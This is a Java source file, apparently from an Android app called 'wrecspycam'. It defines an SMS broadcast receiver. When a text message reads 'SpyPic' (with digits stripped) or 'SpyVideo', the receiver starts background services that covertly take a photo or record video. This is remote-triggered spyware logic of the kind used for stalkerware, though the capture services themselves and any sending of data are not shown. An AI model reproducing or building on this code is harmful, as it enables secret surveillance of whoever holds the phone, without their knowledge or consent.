package com.byteshaft.wrecspycam;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    String msg_from;
    String msgBody;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs;
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        msgBody = msgs[i].getMessageBody();
                        String intValue = msgBody.replaceAll("[^0-9]", "");
                        Log.i("SPY_CAM" , "INT :" + intValue);
                        System.out.println(intValue);
                        String getMsg = msgBody.replaceAll("[0-9]","");
                        Log.i("SPY_CAM" , "Msg :" + getMsg);
                        if (getMsg.equals("SpyPic")) {
                            Log.i("SPY_CAM" , "Capturing Image");
                            Intent serviceIntent = new Intent(context, SpyPictureService.class);
                            context.startService(serviceIntent);
                        } else if (msgBody.equals("SpyVideo")) {
                            Log.i("SPY_CAM", "Capturing Video");
                            Intent videoIntent = new Intent(context, SpyVideoService.class);
                            context.startService(videoIntent);
                        }
                    }
                } catch (Exception e) {
                            Log.d("Exception caught", e.getMessage());
                }
            }
        }
    }
}
